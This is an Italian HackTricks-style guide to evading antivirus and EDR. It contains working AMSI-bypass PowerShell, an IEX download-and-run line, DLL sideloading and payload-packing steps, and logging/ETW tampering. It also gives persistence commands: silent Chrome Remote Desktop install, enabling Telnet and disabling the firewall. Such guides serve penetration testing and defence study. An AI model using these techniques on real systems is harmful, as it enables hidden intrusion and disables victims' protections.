# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare il funzionamento di Windows Defender simulando un altro AV.
- [Disabilita Defender se sei admin](basic-powershell-for-pentesters/README.md)

## **Metodologia di Evasione AV**

Attualmente, gli AV utilizzano diversi metodi per controllare se un file è dannoso o meno, rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico viene ottenuto contrassegnando stringhe o array di byte dannosi noti in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che utilizzare strumenti pubblici noti potrebbe farti catturare più facilmente, poiché probabilmente sono stati analizzati e contrassegnati come dannosi. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di un caricatore per decrittografare ed eseguire il programma in memoria.

- **Offuscamento**

A volte tutto ciò che devi fare è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può essere un compito che richiede tempo a seconda di ciò che stai cercando di offuscare.

- **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non ci saranno firme dannose note, ma questo richiede molto tempo e impegno.

> [!TIP]
> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente, in questo modo, può dirti esattamente quali sono le stringhe o i byte contrassegnati nel tuo binario.

Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su evasione AV pratica.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in un sandbox e osserva attività dannose (ad es. cercare di decrittografare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sonno prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi utilizzare sonni lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sonno a seconda di come è implementato.
- **Controllo delle risorse della macchina** Di solito le sandbox hanno pochissime risorse con cui lavorare (ad es. < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole, non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi mirare a un utente la cui workstation è unita al dominio "contoso.local", puoi fare un controllo sul dominio del computer per vedere se corrisponde a quello che hai specificato, se non corrisponde, puoi far uscire il tuo programma.

Si scopre che il nome della macchina della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione, se il nome corrisponde a HAL9TH, significa che sei all'interno della sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per andare contro le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti chiederti qualcosa:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso che è meno conosciuto e fa anche il dump di LSASS.

La risposta giusta è probabilmente quest'ultima. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più contrassegnato pezzo di malware dagli AV e dagli EDR, mentre il progetto stesso è super interessante, è anche un incubo lavorarci per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è raggiungere l'evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì fino a quando non sei soddisfatto del risultato.

## EXEs vs DLLs

Ogni volta che è possibile, **dai sempre priorità all'uso di DLL per l'evasione**, nella mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di essere eseguito come DLL ovviamente).

Come possiamo vedere in questa immagine, un Payload DLL di Havoc ha un tasso di rilevamento di 4/26 in antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto antiscan.me di un normale payload EXE di Havoc vs un normale payload DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal caricatore posizionando sia l'applicazione vittima che il/i payload dannoso/i uno accanto all'altro.

Puoi controllare i programmi suscettibili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi suscettibili al DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare i programmi DLL Hijackable/Sideloadable da solo**, questa tecnica è piuttosto furtiva se eseguita correttamente, ma se utilizzi programmi Sideloadable DLL noti pubblicamente, potresti essere facilmente catturato.

Semplicemente posizionare una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma fa dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e potendo gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà 2 file: un modello di codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) che la DLL proxy hanno un tasso di rilevamento di 0/26 in [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD di S3cur3Th1sSh1t su twitch](https://www.twitch.tv/videos/1644171543) riguardo al DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su quanto abbiamo discusso in modo più approfondito.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload per bypassare gli EDR utilizzando processi sospesi, syscalls diretti e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo, ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo strumento, se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Interfaccia di Scansione Anti-Malware)

AMSI è stato creato per prevenire "[malware senza file](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per prevenirlo, poiché non aveva abbastanza visibilità.

La funzione AMSI è integrata in questi componenti di Windows.

- Controllo dell'Account Utente, o UAC (elevazione di EXE, COM, MSI o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo i contenuti degli script in una forma sia non crittografata che non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come precede `amsi:` e poi il percorso all'eseguibile da cui è stato eseguito lo script, in questo caso, powershell.exe

Non abbiamo scaricato alcun file su disco, ma siamo stati comunque catturati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, il codice C# viene eseguito tramite AMSI. Questo influisce anche su `Assembly.Load(byte[])` per l'esecuzione in memoria. Ecco perché si consiglia di utilizzare versioni inferiori di .NET (come 4.7.2 o inferiori) per l'esecuzione in memoria se si desidera eludere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI funziona principalmente con rilevamenti statici, quindi, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se ha più strati, quindi l'offuscamento potrebbe essere una cattiva opzione a seconda di come viene fatto. Questo rende non così semplice eludere. Anche se, a volte, tutto ciò che devi fare è cambiare un paio di nomi di variabili e andrà bene, quindi dipende da quanto qualcosa è stato segnalato.

- **Evasione AMSI**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forzare un Errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) comporterà che non verrà avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una firma per prevenire un uso più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastava una riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell attuale. Questa riga è stata ovviamente segnalata da AMSI stesso, quindi è necessaria qualche modifica per utilizzare questa tecnica.

Ecco un bypass AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che questo verrà probabilmente segnalato una volta pubblicato questo post, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni per restituire il codice per E_INVALIDARG, in questo modo, il risultato della scansione effettiva restituirà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Si prega di leggere [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Ci sono anche molte altre tecniche utilizzate per bypassare AMSI con PowerShell, dai un'occhiata a [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

Questo strumento [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) genera anche script per bypassare AMSI.

**Rimuovi la firma rilevata**

Puoi utilizzare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la firma AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente per la firma AMSI e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che utilizzano AMSI**

Puoi trovare un elenco di prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se utilizzi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e risoluzione dei problemi, ma può anche essere un **problema per gli attaccanti che vogliono evitare il rilevamento**.

Per bypassare il logging di PowerShell, puoi utilizzare le seguenti tecniche:

- **Disabilitare la trascrizione di PowerShell e il logging dei moduli**: Puoi utilizzare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Usare la versione 2 di PowerShell**: Se utilizzi la versione 2 di PowerShell, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Usare una sessione di PowerShell non gestita**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per avviare un PowerShell senza difese (questo è ciò che `powerpick` di Cobalt Strike utilizza).

## Obfuscation

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla crittografia dei dati, il che aumenterà l'entropia del binario rendendo più facile per gli AV e gli EDR rilevarlo. Fai attenzione a questo e magari applica la crittografia solo a sezioni specifiche del tuo codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizzano malware che utilizzano ConfuserEx 2 (o fork commerciali) è comune affrontare diversi strati di protezione che bloccheranno decompilatori e sandbox. Il flusso di lavoro qui sotto ripristina in modo affidabile un **IL quasi originale** che può poi essere decompilato in C# in strumenti come dnSpy o ILSpy.

1.  Rimozione dell'anti-tampering – ConfuserEx crittografa ogni *corpo del metodo* e lo decrittografa all'interno del *costruttore statico* del *modulo* (`<Module>.cctor`). Questo patcha anche il checksum PE, quindi qualsiasi modifica causerà il crash del binario. Usa **AntiTamperKiller** per localizzare le tabelle dei metadati crittografati, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tampering (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Recupero di simboli / flusso di controllo – fornisci il file *pulito* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà l'appiattimento del flusso di controllo, ripristinerà gli spazi dei nomi originali, le classi e i nomi delle variabili e decrittograferà le stringhe costanti.

3.  Rimozione delle chiamate proxy – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (alias *chiamate proxy*) per rompere ulteriormente la decompilazione. Rimuovile con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante sotto dnSpy, cerca grandi blob Base64 o utilizzi di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il *vero* payload. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato all'interno di `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** dover eseguire il campione malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo personalizzato chiamato `ConfusedByAttribute` che può essere utilizzato come IOC per triage automatico dei campioni.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di fornire una maggiore sicurezza del software attraverso [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, al momento della compilazione, codice offuscato senza utilizzare alcun strumento esterno e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiungi uno strato di operazioni offuscate generate dal framework di metaprogrammazione dei template C++ che renderà la vita della persona che desidera craccare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscator binario x64 in grado di offuscare vari file pe diversi tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice a grana fine per linguaggi supportati da LLVM che utilizza ROP (programmazione orientata al ritorno). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questo schermo quando scaricavi alcuni eseguibili da internet ed eseguendoli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza destinato a proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può ancora essere eseguito cliccando su Maggiori informazioni -> Esegui comunque).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome di Zone.Identifier che viene creato automaticamente al momento del download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dello Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **fidato** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ricevano il Mark of The Web è confezionarli all'interno di qualche tipo di contenitore come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che confeziona i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO utilizzando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di registrazione in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Simile a come AMSI è disabilitato (bypassato), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo viene fatto patchando la funzione in memoria per restituire immediatamente, disabilitando effettivamente la registrazione ETW per quel processo.

Puoi trovare ulteriori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

Caricare binari C# in memoria è noto da un po' di tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere catturati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo solo preoccuparci di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) forniscono già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Comporta **l'innesco di un nuovo processo sacrificabile**, iniettando il tuo codice dannoso di post-exploitation in quel nuovo processo, eseguendo il tuo codice dannoso e, una volta terminato, uccidendo il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo di impianto Beacon. Questo significa che se qualcosa nella nostra azione di post-exploitation va storto o viene catturato, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere catturato da **Rilevamenti Comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice dannoso di post-exploitation **nel proprio processo**. In questo modo, puoi evitare di dover creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto con l'esecuzione del tuo payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** poiché potrebbe bloccarsi.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di assembly C#, ti consiglio di controllare questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**, dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al video di [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilizzando Altri Linguaggi di Programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice dannoso utilizzando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attaccante**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script, ma utilizzando Go, Java, PHP ecc. abbiamo **maggiore flessibilità per bypassare le firme statiche**. Testare con script di reverse shell casuali non offuscati in questi linguaggi si è rivelato un successo.

## TokenStomping

Il token stomping è una tecnica che consente a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo loro di ridurre i privilegi in modo che il processo non muoia ma non abbia i permessi per controllare attività dannose.

Per prevenire ciò, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilizzando Software Affidabile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile semplicemente distribuire Chrome Remote Desktop nel PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Imposta tramite SSH", e poi clicca sul file MSI per Windows per scaricare il file MSI.
2. Esegui l'installer silenziosamente nella vittima (richiesta di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca su avanti. La procedura guidata ti chiederà quindi di autorizzare; clicca sul pulsante Autorizza per continuare.
4. Esegui il parametro fornito con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che consente di impostare il pin senza utilizzare l'interfaccia grafica).

## Evasione Avanzata

L'evasione è un argomento molto complicato, a volte devi tenere conto di molte diverse fonti di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevato in ambienti maturi.

Ogni ambiente contro cui ti scontri avrà i propri punti di forza e di debolezza.

Ti incoraggio vivamente a guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'idea delle tecniche di evasione più avanzate.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro grande intervento di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasione in Profondità.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche Vecchie**

### **Controlla quali parti Defender trova come dannose**

Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a **scoprire quale parte Defender** trova come dannosa e te lo dividerà.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un'offerta web aperta che fornisce il servizio in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows 10, tutte le versioni di Windows venivano fornite con un **server Telnet** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **partire** quando il sistema viene avviato e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disabilita TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

